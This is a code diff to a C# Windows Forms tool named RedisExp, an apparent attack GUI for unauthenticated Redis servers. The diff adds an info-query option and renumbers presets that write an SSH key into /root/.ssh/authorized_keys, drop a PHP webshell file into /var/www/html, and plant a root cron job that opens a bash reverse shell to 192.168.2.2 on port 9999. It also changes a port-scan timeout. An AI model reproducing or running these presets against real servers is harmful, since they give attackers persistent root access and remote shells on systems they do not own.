@@ -12,10 +12,11 @@ namespace RedisExp
 
         private void Form1_Load(object sender, EventArgs e)
         {
-            
+
         }
 
-        private void contentBox_TextChanged(object sender, EventArgs e) {
+        private void contentBox_TextChanged(object sender, EventArgs e)
+        {
             this.contentBox.LanguageOption = RichTextBoxLanguageOptions.UIFonts;
         }
 
@@ -23,21 +24,26 @@ namespace RedisExp
         private void expBox_TextChanged(object sender, EventArgs e)
         {
             /*
+            查看info信息
             ssh公钥
             webshell
             反弹shell
              */
             if (expBox.SelectedIndex == 0)
             {
-                pathBox.Text = "/root/.ssh/authorized_keys";
-                expBox.SelectedIndex = 0;
+                pathBox.Text = "info查询";
             }
             else if (expBox.SelectedIndex == 1)
+            {
+                pathBox.Text = "/root/.ssh/authorized_keys";
+                expBox.SelectedIndex = 1;
+            }
+            else if (expBox.SelectedIndex == 2)
             {
                 pathBox.Text = "/var/www/html/redisat.php";
                 contentBox.Text = "<?php phpinfo(); ?>";
             }
-            else if (expBox.SelectedIndex == 2)
+            else if (expBox.SelectedIndex == 3)
             {
                 pathBox.Text = "/var/spool/cron/root";
                 contentBox.Text = "* * * * * bash -i >& /dev/tcp/192.168.2.2/9999 0>&1";
@@ -50,7 +56,7 @@ namespace RedisExp
             int port = int.Parse(portBox.Text); // The port to check
             string password = passBox.Text;
 
-            bool isOpen = PortScanner.IsPortOpen(host, port, 2);
+            bool isOpen = PortScanner.IsPortOpen(host, port, 2000);
             if (!isOpen)
             {
                 logTextBoxAdd("端口未打开，请稍后再试");
@@ -66,6 +72,10 @@ namespace RedisExp
             rdsexp.setFilename(pathBox.Text);
             var chk = rdsexp.Check();
             logTextBoxAdd(chk.Item2);
+            if (expBox.SelectedIndex == 0)
+            {
+                return;
+            }
             if (!chk.Item1)
             {
                 return;
@@ -82,7 +92,7 @@ namespace RedisExp
 
         private void logTextBoxAdd(String log)
         {
-            logTextBox.Text = logTextBox.Text +"\n"+ log;
+            logTextBox.Text = logTextBox.Text + "\n" + log;
             logTextBox.SelectionStart = logTextBox.Text.Length;
             logTextBox.ScrollToCaret();
         }
